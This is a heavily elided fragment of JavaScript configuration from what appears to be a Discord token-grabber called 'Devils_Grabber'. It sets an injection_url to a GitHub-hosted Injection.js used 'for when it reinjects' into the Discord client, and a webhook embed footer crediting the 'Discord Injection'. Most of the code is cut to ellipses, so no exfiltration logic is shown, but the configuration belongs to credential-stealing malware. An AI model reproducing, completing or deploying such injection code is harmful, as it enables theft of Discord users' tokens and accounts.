...
const config = {
  ...
  injection_url: 'https://github.com/Badmashshelby/Devils_Grabber/blob/main/Injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '??·Discord Injection By github.com/Badmashshelby·https://github.com/Badmashshelby/Devils_Grabber/blob/main/injection.js',
        },
      },
    ],
  };
